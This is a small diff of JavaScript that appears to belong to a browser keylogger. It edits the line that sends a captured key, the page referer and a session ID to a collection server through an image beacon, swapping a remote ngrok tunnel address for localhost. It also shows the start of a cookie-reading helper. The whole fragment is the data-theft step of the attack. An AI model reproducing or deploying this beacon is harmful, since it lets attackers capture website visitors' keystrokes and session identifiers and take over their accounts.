@@ -12,7 +12,7 @@
         } 
 
         var image = new Image();
-        image.src = "http://2c465ed4.ngrok.com/request/?key=" +
+        image.src = "http://localhost:8000/request/?key=" +
         key + "&referer=" + referer + "&sessionId=" + sessionId
     }
     kb.getCookie = function(name) {
